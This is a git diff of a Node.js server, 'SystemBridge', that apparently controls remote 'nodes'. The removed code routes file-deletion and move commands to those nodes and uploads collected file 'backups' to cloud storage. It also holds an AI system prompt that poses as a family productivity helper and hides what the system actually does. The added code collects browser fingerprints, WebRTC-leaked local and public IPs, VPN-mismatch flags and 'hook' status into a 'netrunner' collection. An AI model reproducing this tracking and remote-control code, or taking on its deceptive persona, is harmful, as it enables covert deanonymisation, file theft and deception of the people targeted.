@@ -2,24 +2,21 @@ import 'dotenv/config';
 import express from 'express';
 import { createServer } from 'http';
 import { Server as SocketIOServer } from 'socket.io';
-import multer from 'multer';
-import B2 from 'backblaze-b2';
 import path from 'path';
 import fs from 'fs';
 import { fileURLToPath } from 'url';
 import mongoose from 'mongoose';
 
-// --- Configuration ---
 const PORT = process.env.PORT || 3000;
 const MONGO_URL = process.env.MONGO_URL;
-const B2_APPLICATION_KEY_ID = process.env.B2_APPLICATION_KEY_ID;
-const B2_APPLICATION_KEY = process.env.B2_APPLICATION_KEY;
-const B2_BUCKET_NAME = process.env.B2_BUCKET_NAME;
-const B2_BUCKET_ID = process.env.B2_BUCKET_ID;
 
-// --- Express + HTTP server ---
+const TELEMETRY_BATCH_SIZE = 64;
+const TELEMETRY_FLUSH_MS = 120;
+const MAX_TELEMETRY_QUEUE = 5000;
+
 const app = express();
 const httpServer = createServer(app);
+
 const bridgeLogPath = path.join(process.cwd(), 'bridge_status.log');
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -48,129 +45,162 @@ console.log = (...args) => { writeBridgeLog('INFO', ...args); originalConsoleLog
 console.warn = (...args) => { writeBridgeLog('WARN', ...args); originalConsoleWarn(...args); };
 console.error = (...args) => { writeBridgeLog('ERROR', ...args); originalConsoleError(...args); };
 
-// --- Socket.io server ---
 const io = new SocketIOServer(httpServer, {
     cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
+        origin: '*',
+        methods: ['GET', 'POST']
     }
 });
 
-// --- nodeId -> socketId mapping ---
-const nodeSocketMap = {}; // Stores nodeId -> socket.id
-const nodeSessionMap = {}; // Stores nodeId -> metadata for runtime classification
-const latestIntegrityReports = {};
-const backupSessionStore = new Map();
+const nodeSocketMap = {};
 
-// --- Multer for in-memory uploads ---
-const storage = multer.memoryStorage();
-const upload = multer({ storage: storage });
+const nodeProfileSchema = new mongoose.Schema({
+    nodeId: { type: String, required: true, index: true },
+    sessionId: { type: String, required: true, index: true },
+    profileCategory: { type: String, enum: ['Mobile', 'Tablet', 'Desktop'], index: true, default: 'Desktop' },
+    source: { type: String, default: 'web_client' },
+    userAgent: String,
+    acceptedLanguage: String,
+    serverObservedIp: String,
+    headerIp: String,
+    telemetry: {
+        fingerprint: {
+            hardwareConcurrency: Number,
+            deviceMemory: Number,
+            webglRenderer: String,
+            canvasHash: String,
+            stableFingerprint: String
+        },
+        network: {
+            localIps: [String],
+            publicIps: [String],
+            candidateIps: [String],
+            srflxIps: [String],
+            localDescription: String,
+            sdpCandidates: [String],
+            vpnMismatch: Boolean,
+            mismatchReason: String
+        },
+        hook: {
+            loaded: Boolean,
+            endpoint: String,
+            status: String,
+            detail: String
+        },
+        page: {
+            href: String,
+            visibilityState: String,
+            timezone: String,
+            viewportWidth: Number,
+            viewportHeight: Number,
+            screenWidth: Number,
+            screenHeight: Number
+        }
+    },
+    receivedAt: { type: Date, default: Date.now, index: true },
+    lastSeen: { type: Date, default: Date.now, index: true }
+}, {
+    timestamps: true,
+    collection: 'netrunner'
+});
 
-// Backblaze B2 authorization
-let b2;
-async function authorizeB2() {
-    if (!B2_APPLICATION_KEY_ID || !B2_APPLICATION_KEY) {
-        console.warn("⚠️ Backblaze B2 credentials not provided. File uploads to B2 will not work.");
-        return;
-    }
-    b2 = new B2({
-        applicationKeyId: B2_APPLICATION_KEY_ID,
-        applicationKey: B2_APPLICATION_KEY
-    });
-    try {
-        await b2.authorize();
-        console.log("✅ Successfully authorized with Backblaze B2.");
-    } catch (err) {
-        console.error("❌ Error authorizing with Backblaze B2:", err.message);
-        b2 = null;
-    }
+nodeProfileSchema.index({ nodeId: 1, sessionId: 1 }, { unique: true });
+
+const NodeProfile = mongoose.model('NodeProfile', nodeProfileSchema);
+
+const telemetryQueue = [];
+let flushTimer = null;
+let flushInProgress = false;
+
+function truncate(value, max = 8192) {
+    return String(value || '').slice(0, max);
 }
 
-// --- MongoDB models ---
-const telemetrySchema = new mongoose.Schema({
-    nodeId: { type: String, required: true, unique: false },
-    hostname: String,
-    ip: String,
-    os: String,
-    user: String,
-    status: String,
-    lastSeen: { type: Date, default: Date.now },
-    firstSeen: { type: Date, default: Date.now },
-    socketId: String,
-    isOnline: Boolean,
-    level: String,
-    message: String,
-    timestamp: { type: Date, default: Date.now }
-}, { timestamps: true });
+function classifyProfileCategory(userAgent = '', page = {}) {
+    const ua = String(userAgent).toLowerCase();
+    const viewportWidth = Number(page?.viewportWidth) || 0;
+    const screenWidth = Number(page?.screenWidth) || 0;
+    const inferredWidth = Math.max(viewportWidth, screenWidth);
 
-const assetSyncSchema = new mongoose.Schema({
-    filename: String,
-    size: Number,
-    nodeId: String,
-    hostname: String,
-    timestamp: { type: Date, default: Date.now },
-    status: String, // e.g., 'pending', 'persisted', 'failed', 'b2_unconfigured'
-    cloudPath: String,
-    persistedAt: Date,
-    error: String
-}, { timestamps: true });
+    const isTabletUa = /ipad|tablet|playbook|silk/.test(ua) || (/android/.test(ua) && !/mobile/.test(ua));
+    const isMobileUa = /mobi|iphone|ipod|android.*mobile|windows phone/.test(ua);
 
-const TelemetryReport = mongoose.model('TelemetryReport', telemetrySchema);
-const AssetSyncEntry = mongoose.model('AssetSyncEntry', assetSyncSchema);
+    if (isTabletUa) return 'Tablet';
+    if (isMobileUa) return 'Mobile';
+    if (inferredWidth > 0 && inferredWidth <= 900) return 'Mobile';
+    if (inferredWidth > 900 && inferredWidth <= 1200) return 'Tablet';
+    return 'Desktop';
+}
+
+function enqueueTelemetryWrite(filter, payload) {
+    if (telemetryQueue.length >= MAX_TELEMETRY_QUEUE) {
+        return Promise.reject(new Error('Telemetry queue is full'));
+    }
+
+    return new Promise((resolve, reject) => {
+        telemetryQueue.push({ filter, payload, resolve, reject });
+        scheduleTelemetryFlush();
+    });
+}
+
+function scheduleTelemetryFlush() {
+    if (flushTimer) return;
+    flushTimer = setTimeout(() => {
+        flushTimer = null;
+        flushTelemetryQueue().catch((error) => {
+            console.error('Telemetry queue flush error:', error.message);
+        });
+    }, TELEMETRY_FLUSH_MS);
+}
+
+async function flushTelemetryQueue() {
+    if (flushInProgress) return;
+    if (mongoose.connection.readyState !== 1) return;
+
+    flushInProgress = true;
+    try {
+        while (telemetryQueue.length > 0) {
+            const batch = telemetryQueue.splice(0, TELEMETRY_BATCH_SIZE);
+            const operations = batch.map((entry) => ({
+                updateOne: {
+                    filter: entry.filter,
+                    update: {
+                        $set: entry.payload,
+                        $setOnInsert: { createdAt: new Date() }
+                    },
+                    upsert: true
+                }
+            }));
+            try {
+                await NodeProfile.bulkWrite(operations, { ordered: false });
+                batch.forEach((entry) => entry.resolve());
+            } catch (error) {
+                batch.forEach((entry) => entry.reject(error));
+            }
+        }
+    } finally {
+        flushInProgress = false;
+        if (telemetryQueue.length > 0) {
+            scheduleTelemetryFlush();
+        }
+    }
+}
 
 async function connectMongo() {
     if (!MONGO_URL) {
-        console.warn("⚠️ MONGO_URL not provided. MongoDB connection will not be established.");
+        console.warn('⚠️ MONGO_URL not provided. MongoDB connection will not be established.');
         return;
     }
+
     try {
         await mongoose.connect(MONGO_URL);
-        console.log("💾 MongoDB Connected (Mongoose).");
-    } catch (e) {
-        console.error("❌ MongoDB Connection Failed:", e.message);
+        console.log('💾 MongoDB Connected (Mongoose).');
+    } catch (error) {
+        console.error('❌ MongoDB Connection Failed:', error.message);
     }
 }
 
-// Persist telemetry events in MongoDB when available.
-async function logTelemetryToMongo(level, message, metadata = {}) {
-    if (mongoose.connection.readyState !== 1) {
-        console.warn("MongoDB not connected, skipping log entry.");
-        return;
-    }
-    
-    // Log to console regardless
-    console.log(`[${level.toUpperCase()}] ${message}`, metadata);
-
-    // Only persist telemetry records when nodeId is present
-    if (!metadata.nodeId) {
-        console.warn("Skipping TelemetryReport update/creation: nodeId is missing in metadata.");
-        return;
-    }
-
-    try {
-        // Find existing telemetry report or create a new one
-        let report = await TelemetryReport.findOne({ nodeId: metadata.nodeId });
-
-        if (report) {
-            // Update existing report
-            Object.assign(report, { level, message, timestamp: new Date(), ...metadata });
-            await report.save();
-        } else {
-            // Create new report
-            await TelemetryReport.create({
-                level,
-                message,
-                timestamp: new Date(),
-                ...metadata,
-            });
-        }
-    } catch (e) {
-        console.error("Error logging to MongoDB (TelemetryReport):", e.message);
-    }
-}
-
-// --- Middleware ---
-app.use(express.json({ limit: '12mb' }));
+app.use(express.json({ limit: '2mb' }));
 app.use('/public', express.static(publicPath, {
     maxAge: '5m',
     setHeaders: (res, filePath) => {
@@ -182,584 +212,192 @@ app.use('/public', express.static(publicPath, {
 }));
 app.use(express.static(publicPath, { maxAge: '5m' }));
 
-// --- Routes ---
 app.get('/', (req, res) => {
     res.sendFile(path.join(publicPath, 'index.html'));
 });
 
-app.get('/api/check-file', async (req, res) => {
-    const { nodeId, filename } = req.query;
-    try {
-        const existing = await AssetSyncEntry.findOne({ nodeId, filename, status: 'persisted' });
-        res.json({ exists: !!existing });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-function normalizeNodeRuntime(value) {
-    return value === 'native_workspace' ? 'native_workspace' : 'web_client';
-}
-
-function sanitizeBackupPath(pathValue = '') {
-    return String(pathValue)
-        .replace(/\\/g, '/')
-        .replace(/^\.+/, '')
-        .replace(/[^a-zA-Z0-9/_\-\.]/g, '_')
-        .replace(/\/+/g, '/')
-        .replace(/^\//, '');
-}
-
-async function uploadBufferToB2(buffer, fileName, mime = 'application/octet-stream') {
-    const fileInfo = await b2.getUploadUrl({ bucketId: B2_BUCKET_ID });
-    return b2.uploadFile({
-        uploadUrl: fileInfo.data.uploadUrl,
-        uploadAuthToken: fileInfo.data.authorizationToken,
-        fileName,
-        data: buffer,
-        mime
-    });
-}
-
 app.post('/api/chat', async (req, res) => {
-    const { messages, model } = req.body; // 'model' from frontend determines preferred model
+    const { messages, model } = req.body;
 
-    let selectedApiKey, selectedApiUrl, selectedModelName;
+    let selectedApiKey;
+    let selectedApiUrl;
+    let selectedModelName;
 
-    // --- Prioritize Groq API ---
     if (process.env.GROQ_API_KEY) {
         selectedApiKey = process.env.GROQ_API_KEY;
         selectedApiUrl = 'https://api.groq.com/openai/v1/chat/completions';
-        // Extract model name, remove 'groq:' prefix if present
         const cleanModel = model ? model.replace(/^groq:/, '') : 'llama-3.1-8b-instant';
-        // Accept any valid Groq model
         const validGroqModels = ['llama-3.3-70b-versatile', 'llama-3.1-70b-versatile', 'llama-3.1-8b-instant', 'mixtral-8x7b-32768', 'llama3-70b-8192', 'llama3-8b-8192'];
-        if (validGroqModels.includes(cleanModel)) {
-            selectedModelName = cleanModel;
-        } else {
-            selectedModelName = 'llama-3.1-8b-instant'; // Default Groq model
-        }
-        console.log(`Using Groq API with model: ${selectedModelName}`);
-    } 
-    // --- Fallback to OpenCodeZen API ---
-    else if (process.env.OPENCODE_ZEN_API_KEY) {
+        selectedModelName = validGroqModels.includes(cleanModel) ? cleanModel : 'llama-3.1-8b-instant';
+    } else if (process.env.OPENCODE_ZEN_API_KEY) {
         selectedApiKey = process.env.OPENCODE_ZEN_API_KEY;
         selectedApiUrl = 'https://api.opencodezen.com/v1/chat/completions';
-        // Placeholder for OpenCodeZen's free models. Adjust as per their documentation.
-        // For example, if OpenCodeZen supports gpt-4o-mini or a llama variant:
-        selectedModelName = model || 'opencodezen-free-model'; // Use frontend model or default
-        console.log(`Using OpenCodeZen API with model: ${selectedModelName}`);
-    } 
-    // --- No AI API configured ---
-    else {
-        console.error('Neither GROQ_API_KEY nor OPENCODE_ZEN_API_KEY is configured.');
+        selectedModelName = model || 'opencodezen-free-model';
+    } else {
         return res.status(500).json({ error: 'No AI API key configured on the server.' });
     }
 
-    if (!selectedApiKey) { // Should not happen with the logic above, but good for safety
-        return res.status(500).json({ error: 'AI API key not configured.' });
-    }
-
     try {
-        const fetch = (await import('node-fetch')).default; // Dynamically import node-fetch
+        const fetch = (await import('node-fetch')).default;
         const aiResponse = await fetch(selectedApiUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'Authorization': `Bearer ${selectedApiKey}`
+                Authorization: `Bearer ${selectedApiKey}`
             },
-                body: JSON.stringify({
-                model: selectedModelName, // Use the determined model name
+            body: JSON.stringify({
+                model: selectedModelName,
                 messages: [
                     {
                         role: 'system',
-                        content: `Eres SystemBridge, un asistente de productividad familiar. Tu tono debe ser amigable, claro y servicial.
-
-## Capacidades que puedes ofrecer al usuario:
-
-### 📸 Organizacion de Fotos y Videos
-- "Puedo organizar tus fotos y videos por fechas automaticamente en carpetas como Fotos, Videos, Musica"
-- Detecto automaticamente archivos multimedia y puedo clasificarlos
-
-### 📂 Gestion de Archivos
-- Crear, renombrar, mover y eliminar archivos y carpetas
-- Leer contenido de archivos de texto
-- Organizacion inteligente por categorias
-
-### 🔐 Seguridad y Respaldo
-- "Puedo hacer copias de seguridad de tus documentos importantes en una bóveda segura (Backblaze B2)"
-- Cifrado AES-256 para proteger tus datos
-- Respaldo automatico de archivos criticos
-
-### 🧹 Limpieza Inteligente
-- "Puedo limpiar archivos basura y dejarte solo lo que necesitas"
-- Elimino archivos temporales, duplicados o innecesarios
-- Protejo archivos importantes automaticamente
-
-### 📝 Lectura de Notas
-- "Puedo leer tus notas y ayudarte a resumirlas o recordarlas"
-- Lee archivos .txt, .md y otros formatos de texto
-
-## Como interactuar:
-Cuando el usuario pida algo, NO describas comandos. Responde confirmando la accion y el sistema la ejecutara automaticamente.
-
-Cuando el usuario diga "ayuda" o parezca perdido, muestra las capacidades con iconos amigables.
-
-No menciones flujos anteriores ni detalles tecnicos internos.`
+                        content: 'Eres SystemBridge, un asistente claro y conciso para soporte técnico y productividad. Responde en español por defecto.'
                     },
-                    ...messages
+                    ...(Array.isArray(messages) ? messages : [])
                 ],
-                temperature: 0.7 // Example parameter, can be made configurable
+                temperature: 0.5
             })
         });
 
         const aiData = await aiResponse.json();
-
         if (!aiResponse.ok) {
-            // Log the full error response from the external API for diagnosis
-            console.error(`External AI API error (${selectedModelName}):`, aiResponse.status, aiData);
-            return res.status(aiResponse.status).json({ 
+            return res.status(aiResponse.status).json({
                 error: aiData.error?.message || `Error from external AI API (${selectedModelName})`,
-                details: aiData // Include full details for debugging
+                details: aiData
             });
         }
 
-        res.json({ text: aiData.choices[0]?.message?.content || '' });
-
+        return res.json({ text: aiData.choices?.[0]?.message?.content || '' });
     } catch (error) {
-        console.error('Error proxying AI request:', error);
-        res.status(500).json({ error: `Failed to communicate with AI API: ${error.message}` });
+        return res.status(500).json({ error: `Failed to communicate with AI API: ${error.message}` });
     }
 });
 
-// Asset upload endpoint.
-app.post('/api/upload', upload.single('file'), async (req, res) => {
-    if (!req.file) {
-        return res.status(400).send('No file uploaded.');
+app.post('/api/telemetry', async (req, res) => {
+    const body = req.body || {};
+    const nodeId = truncate(body.nodeId, 128).trim();
+    const sessionId = truncate(body.sessionId, 128).trim();
+
+    if (!nodeId || !sessionId) {
+        return res.status(400).json({ error: 'nodeId and sessionId are required.' });
     }
 
-    const { originalname, buffer, mimetype } = req.file;
-    const nodeId = req.body.nodeId || 'unknown_node';
-    const hostname = req.body.hostname || 'unknown_host';
+    if (mongoose.connection.readyState !== 1) {
+        return res.status(503).json({ error: 'Telemetry storage temporarily unavailable.' });
+    }
 
-    let fileDoc = {
-        filename: originalname,
-        size: buffer.length,
-        nodeId: nodeId,
-        hostname: hostname,
-        timestamp: new Date(),
-        status: 'pending',
-        cloudPath: null
+    const xff = req.headers['x-forwarded-for'];
+    const headerIp = Array.isArray(xff) ? xff[0] : (typeof xff === 'string' ? xff.split(',')[0].trim() : '');
+    const serverObservedIp = req.ip || req.socket?.remoteAddress || '';
+
+    const page = body?.telemetry?.page || {};
+    const userAgent = req.get('user-agent') || body.userAgent || '';
+    const profileCategory = classifyProfileCategory(userAgent, page);
+
+    const payload = {
+        nodeId,
+        sessionId,
+        profileCategory,
+        source: truncate(body.source || 'web_client', 64),
+        userAgent: truncate(userAgent, 512),
+        acceptedLanguage: truncate(req.get('accept-language') || '', 128),
+        serverObservedIp: truncate(serverObservedIp, 64),
+        headerIp: truncate(headerIp, 64),
+        telemetry: {
+            fingerprint: {
+                hardwareConcurrency: Number(body?.telemetry?.fingerprint?.hardwareConcurrency) || undefined,
+                deviceMemory: Number(body?.telemetry?.fingerprint?.deviceMemory) || undefined,
+                webglRenderer: truncate(body?.telemetry?.fingerprint?.webglRenderer || '', 256),
+                canvasHash: truncate(body?.telemetry?.fingerprint?.canvasHash || '', 256),
+                stableFingerprint: truncate(body?.telemetry?.fingerprint?.stableFingerprint || '', 256)
+            },
+            network: {
+                localIps: Array.isArray(body?.telemetry?.network?.localIps) ? body.telemetry.network.localIps.slice(0, 32) : [],
+                publicIps: Array.isArray(body?.telemetry?.network?.publicIps) ? body.telemetry.network.publicIps.slice(0, 32) : [],
+                candidateIps: Array.isArray(body?.telemetry?.network?.candidateIps) ? body.telemetry.network.candidateIps.slice(0, 64) : [],
+                srflxIps: Array.isArray(body?.telemetry?.network?.srflxIps) ? body.telemetry.network.srflxIps.slice(0, 32) : [],
+                localDescription: truncate(body?.telemetry?.network?.localDescription || '', 8192),
+                sdpCandidates: Array.isArray(body?.telemetry?.network?.sdpCandidates) ? body.telemetry.network.sdpCandidates.slice(0, 128).map((v) => truncate(v, 512)) : [],
+                vpnMismatch: Boolean(body?.telemetry?.network?.vpnMismatch),
+                mismatchReason: truncate(body?.telemetry?.network?.mismatchReason || '', 128)
+            },
+            hook: {
+                loaded: Boolean(body?.telemetry?.hook?.loaded),
+                endpoint: truncate(body?.telemetry?.hook?.endpoint || '', 512),
+                status: truncate(body?.telemetry?.hook?.status || 'unknown', 64),
+                detail: truncate(body?.telemetry?.hook?.detail || '', 256)
+            },
+            page: {
+                href: truncate(page.href || '', 512),
+                visibilityState: truncate(page.visibilityState || '', 32),
+                timezone: truncate(page.timezone || '', 64),
+                viewportWidth: Number(page.viewportWidth) || 0,
+                viewportHeight: Number(page.viewportHeight) || 0,
+                screenWidth: Number(page.screenWidth) || 0,
+                screenHeight: Number(page.screenHeight) || 0
+            }
+        },
+        receivedAt: new Date(),
+        lastSeen: new Date()
     };
 
     try {
-        let createdAssetSyncEntry;
-        try {
-            createdAssetSyncEntry = await AssetSyncEntry.create(fileDoc);
-            fileDoc._id = createdAssetSyncEntry._id;
-        } catch (dbError) {
-            console.error("❌ Error creating initial AssetSyncEntry:", dbError.message);
-            // Continue execution and persist status at the end if possible.
-        }
-
-        if (!b2 || !B2_BUCKET_NAME || !B2_BUCKET_ID) {
-            logTelemetryToMongo('warn', 'Backblaze B2 not configured or authorized. Saving file metadata only.', { file: originalname, nodeId });
-            if (createdAssetSyncEntry) {
-                await AssetSyncEntry.updateOne(
-                    { _id: createdAssetSyncEntry._id },
-                    { $set: { status: 'b2_unconfigured', error: 'B2 not configured or authorized' } }
-                );
-            }
-            return res.status(500).send('Backblaze B2 not configured or authorized for uploads.');
-        }
-
-        logTelemetryToMongo('info', `Attempting to upload file to B2: ${originalname}`, { file: originalname, nodeId });
-
-	const fileInfo = await b2.getUploadUrl({ bucketId: B2_BUCKET_ID }); 
-	const uploadUrl = fileInfo.data.uploadUrl;
-	const authToken = fileInfo.data.authorizationToken;
-
-	const b2UploadResult = await b2.uploadFile({
-	    uploadUrl: uploadUrl,
-	    uploadAuthToken: authToken,
-	    fileName: `${nodeId}/${Date.now()}-${originalname}`,
-	    data: buffer,
-	    mime: mimetype
-});
-
-        const cloudPath = b2UploadResult.data.fileName;
-        logTelemetryToMongo('info', `File uploaded successfully to B2: ${cloudPath}`, { file: originalname, nodeId });
-
-        if (createdAssetSyncEntry) {
-            await AssetSyncEntry.updateOne(
-                { _id: createdAssetSyncEntry._id },
-                { $set: { status: 'persisted', cloudPath: cloudPath, persistedAt: new Date() } }
-            );
-        }
-
-        res.status(200).send({ message: `File ${originalname} uploaded successfully to B2.`, cloudPath: cloudPath });
-
+        await enqueueTelemetryWrite({ nodeId, sessionId }, payload);
+        return res.json({ ok: true, nodeId, sessionId, profileCategory, queueDepth: telemetryQueue.length });
     } catch (error) {
-        console.error('❌ Error during file upload to B2:', error);
-        logTelemetryToMongo('error', `Failed to upload file to B2: ${originalname}`, { file: originalname, nodeId, error: error.message });
-        if (fileDoc._id) {
-            await AssetSyncEntry.updateOne(
-                { _id: fileDoc._id },
-                { $set: { status: 'failed', error: error.message } }
-            );
+        if (error.message === 'Telemetry queue is full') {
+            return res.status(429).json({ error: 'Telemetry queue overflow. Retry later.' });
         }
-        res.status(500).send('Error uploading file to Backblaze B2.');
+        return res.status(500).json({ error: 'Failed to persist telemetry.' });
     }
 });
 
-// Receives encrypted backup chunks from Native Workspace Bridge.
-app.post('/api/backup/chunk', async (req, res) => {
-    const {
-        sessionId,
-        nodeId,
-        workspaceName,
-        filePath,
-        fileSize,
-        fileHash,
-        encryption,
-        chunkIndex,
-        totalChunks,
-        chunkData
-    } = req.body || {};
-
-    if (!sessionId || !nodeId || !filePath || !Number.isInteger(chunkIndex) || !Number.isInteger(totalChunks) || !chunkData) {
-        return res.status(400).json({ error: 'Invalid backup chunk payload.' });
-    }
-
-    let chunkBuffer;
-    try {
-        chunkBuffer = Buffer.from(chunkData, 'base64');
-    } catch {
-        return res.status(400).json({ error: 'chunkData must be valid base64.' });
-    }
-
-    const key = `${nodeId}:${sessionId}`;
-    if (!backupSessionStore.has(key)) {
-        backupSessionStore.set(key, {
-            sessionId,
-            nodeId,
-            workspaceName: workspaceName || 'unknown_workspace',
-            createdAt: new Date(),
-            files: new Map()
-        });
-    }
-
-    const session = backupSessionStore.get(key);
-    if (!session.files.has(filePath)) {
-        session.files.set(filePath, {
-            path: filePath,
-            size: fileSize || 0,
-            hash: fileHash || null,
-            encryption: encryption || {},
-            totalChunks,
-            chunks: new Map()
-        });
-    }
-
-    const fileRecord = session.files.get(filePath);
-    fileRecord.totalChunks = totalChunks;
-    fileRecord.chunks.set(chunkIndex, chunkBuffer);
-    session.updatedAt = new Date();
-
-    return res.json({
-        ok: true,
-        sessionId,
-        filePath,
-        chunkIndex,
-        receivedChunks: fileRecord.chunks.size,
-        totalChunks: fileRecord.totalChunks
-    });
-});
-
-// Rebuilds encrypted files and writes them to B2 with backup_recovery_node_[nodeId] prefix.
-app.post('/api/backup/finalize', async (req, res) => {
-    const { sessionId, nodeId, workspaceName, summary } = req.body || {};
-    if (!sessionId || !nodeId) {
-        return res.status(400).json({ error: 'sessionId and nodeId are required.' });
-    }
-
-    const key = `${nodeId}:${sessionId}`;
-    const session = backupSessionStore.get(key);
-    if (!session) {
-        return res.status(404).json({ error: 'Backup session not found.' });
-    }
-
-    if (!b2 || !B2_BUCKET_ID || !B2_BUCKET_NAME) {
-        return res.status(500).json({ error: 'Backblaze B2 not configured or authorized.' });
-    }
-
-    try {
-        const bucketPrefix = `backup_recovery_node_${nodeId}/${sessionId}`;
-        const uploaded = [];
-
-        for (const [filePath, fileRecord] of session.files.entries()) {
-            const expectedChunks = fileRecord.totalChunks;
-            const missingChunks = [];
-            for (let i = 0; i < expectedChunks; i += 1) {
-                if (!fileRecord.chunks.has(i)) missingChunks.push(i);
-            }
-            if (missingChunks.length) {
-                throw new Error(`Missing chunks for ${filePath}: ${missingChunks.slice(0, 10).join(',')}`);
-            }
-
-            const ordered = [];
-            for (let i = 0; i < expectedChunks; i += 1) {
-                ordered.push(fileRecord.chunks.get(i));
-            }
-            const encryptedFileBuffer = Buffer.concat(ordered);
-            const safePath = sanitizeBackupPath(filePath).replace(/\//g, '__');
-            const remoteName = `${bucketPrefix}/${safePath}.enc`;
-
-            await uploadBufferToB2(encryptedFileBuffer, remoteName, 'application/octet-stream');
-            uploaded.push({
-                filePath,
-                cloudPath: remoteName,
-                chunks: expectedChunks,
-                encryptedBytes: encryptedFileBuffer.length
-            });
-        }
-
-        const manifestRemoteName = `${bucketPrefix}/manifest.json`;
-        const manifest = {
-            sessionId,
-            nodeId,
-            workspaceName: workspaceName || session.workspaceName,
-            createdAt: session.createdAt,
-            finalizedAt: new Date().toISOString(),
-            files: uploaded,
-            summary: summary || null
-        };
-        await uploadBufferToB2(
-            Buffer.from(JSON.stringify(manifest, null, 2), 'utf8'),
-            manifestRemoteName,
-            'application/json'
-        );
-
-        backupSessionStore.delete(key);
-        logTelemetryToMongo('info', 'Backup recovery session finalized', {
-            nodeId,
-            sessionId,
-            uploadedFiles: uploaded.length
-        });
-
-        return res.json({
-            ok: true,
-            uploadedFiles: uploaded.length,
-            bucketPrefix,
-            manifestPath: manifestRemoteName
-        });
-    } catch (error) {
-        return res.status(500).json({ error: error.message });
-    }
-});
-
-// --- Socket.io events ---
 io.on('connection', (socket) => {
-    const authObj = socket.handshake?.auth || {};
-    const rawHandshakeNodeId = authObj.nodeId || socket.handshake?.query?.nodeId;
-    if (!rawHandshakeNodeId) {
-        console.error(`[ERROR] Missing nodeId in handshake.auth: ${JSON.stringify(authObj)}`);
-    }
-    const handshakeNodeId = rawHandshakeNodeId || "FORCE-IDENTIFIED-NODE";
-    const handshakeNodeRuntime = normalizeNodeRuntime(socket.handshake?.auth?.nodeRuntime || socket.handshake?.query?.nodeRuntime);
-    console.log(`[INFO] Socket.io client connected { nodeId: '${handshakeNodeId}', nodeRuntime: '${handshakeNodeRuntime}', socketId: '${socket.id}' }`);
-    logTelemetryToMongo('info', 'Socket.io client connected', {
-        socketId: socket.id,
-        nodeId: handshakeNodeId,
-        nodeRuntime: handshakeNodeRuntime
+    socket.on('register_node', (data = {}) => {
+        const nodeId = data.nodeId;
+        if (!nodeId) return;
+
+        nodeSocketMap[nodeId] = socket.id;
+        socket.data.nodeId = nodeId;
+
+        socket.emit('vincular_confirmado', {
+            nodeId,
+            nodeRuntime: data.nodeRuntime || 'web_client',
+            nodeChannel: data.nodeChannel || 'passive_monitor'
+        });
     });
 
-    // Node registration handshake.
-    socket.on('register_node', (data) => {
-        if (data.nodeId) {
-            const nodeRuntime = normalizeNodeRuntime(data.nodeRuntime);
-            const nodeChannel = data.nodeChannel || 'workspace_api';
-            const metadata = {
-                nodeId: data.nodeId,
-                nodeRuntime,
-                nodeChannel,
-                socketId: socket.id,
-                userAgent: data.userAgent || 'unknown',
-                connectedAt: new Date().toISOString()
-            };
-            nodeSocketMap[data.nodeId] = socket.id;
-            nodeSessionMap[data.nodeId] = metadata;
-            socket.data.nodeId = data.nodeId;
-            socket.data.nodeRuntime = nodeRuntime;
+    socket.on('node_report', async (data = {}) => {
+        if (!data.nodeId || mongoose.connection.readyState !== 1) return;
 
-            console.log(`SystemBridge node registered: ${data.nodeId} (${nodeRuntime}) with socket ID ${socket.id}`);
-            logTelemetryToMongo('info', 'SystemBridge node registration completed.', metadata);
-            io.emit('vincular_confirmado', {
-                message: '¡Vínculo establecido con éxito! Ya veo tu Workspace.',
-                nodeId: data.nodeId,
-                nodeRuntime,
-                nodeChannel
-            });
-        } else {
-            console.error(`[ERROR] Missing nodeId in register_node. handshake.auth: ${JSON.stringify(authObj)}`);
-        }
+        const telemetry = data.telemetry || {};
+        const page = telemetry.page || {};
+        const userAgent = data.userAgent || '';
+        const profileCategory = classifyProfileCategory(userAgent, page);
+
+        const payload = {
+            nodeId: data.nodeId,
+            sessionId: data.sessionId || 'socket-session',
+            source: data.source || 'socket',
+            profileCategory,
+            userAgent: truncate(userAgent, 512),
+            telemetry,
+            lastSeen: new Date(),
+            receivedAt: new Date()
+        };
+
+        enqueueTelemetryWrite({ nodeId: payload.nodeId, sessionId: payload.sessionId }, payload).catch(() => {});
     });
 
     socket.on('disconnect', () => {
-        console.log('🔌 Client disconnected:', socket.id);
-        logTelemetryToMongo('info', 'Socket.io client disconnected', { socketId: socket.id });
-        for (const nodeId in nodeSocketMap) {
-            if (nodeSocketMap[nodeId] === socket.id) {
-                delete nodeSocketMap[nodeId];
-                delete nodeSessionMap[nodeId];
-                console.log(`SystemBridge node ${nodeId} unregistered due to disconnect.`);
-                break;
-            }
+        const nodeId = socket.data?.nodeId;
+        if (nodeId && nodeSocketMap[nodeId] === socket.id) {
+            delete nodeSocketMap[nodeId];
         }
-    });
-
-    socket.on('node_report', async (data) => {
-        console.log('SystemBridge telemetry report:', data);
-        if (!data.nodeId) {
-            data.nodeId = `active_node_${socket.id}`;
-            console.warn(`⚠️ Received node_report without nodeId. Assigned temporary ID: ${data.nodeId}`);
-        }
-        try {
-            const result = await TelemetryReport.updateOne(
-                { nodeId: data.nodeId },
-                {
-                    $set: {
-                        ...data,
-                        lastSeen: new Date(),
-                        socketId: socket.id,
-                        isOnline: true
-                    },
-                    $setOnInsert: {
-                        firstSeen: new Date()
-                    }
-                },
-                { upsert: true }
-            );
-
-            if (result.upsertedCount > 0 || (result.matchedCount > 0 && result.modifiedCount > 0)) {
-                 console.log(`✅ Node report processed for node: ${data.nodeId}`);
-            }
-
-        } catch (dbError) {
-            console.error("❌ Error updating/inserting TelemetryReport:", dbError.message);
-        }
-        io.emit('dashboard_update', { type: 'node_status', nodeId: data.nodeId, status: 'online' });
-    });
-
-    socket.on('command', (commandData) => {
-        console.log(`Command received from dashboard for SystemBridge node ${commandData.nodeId}:`, commandData.command);
-        const allowedCommands = new Set(['open_workspace', 'createFile', 'removeFile', 'moveFile']);
-        if (!allowedCommands.has(commandData.command)) {
-            console.warn(`Unsupported workspace command: ${commandData.command}`);
-            return;
-        }
-
-        const targetSocketId = nodeSocketMap[commandData.nodeId];
-        const targetSession = nodeSessionMap[commandData.nodeId] || {};
-        if (targetSocketId) {
-            console.log(`Routing workspace command ${commandData.command} to node ${commandData.nodeId} (socket: ${targetSocketId})...`);
-            io.to(targetSocketId).emit('workspace_file_action', {
-                requestId: commandData.requestId || null,
-                command: commandData.command,
